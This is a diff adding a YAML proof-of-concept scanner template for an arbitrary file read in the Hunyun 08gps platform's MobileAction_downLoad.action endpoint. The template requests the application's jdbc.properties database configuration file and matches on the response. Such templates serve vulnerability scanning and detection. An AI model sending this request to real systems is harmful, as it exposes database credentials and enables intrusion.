@@ -1,0 +1,13 @@
+name: poc-yaml-hunyun-08gps-MobileAction-downLoad-file-read
+rules:
+  - method: GET
+    path: /08gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"jdbc")
+detail:
+    info: |
+       漏洞链接：http://127.0.0.1/08gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties
+    author: test
+    links:
+        - https://www.freebuf.com/articles/web/380535.html
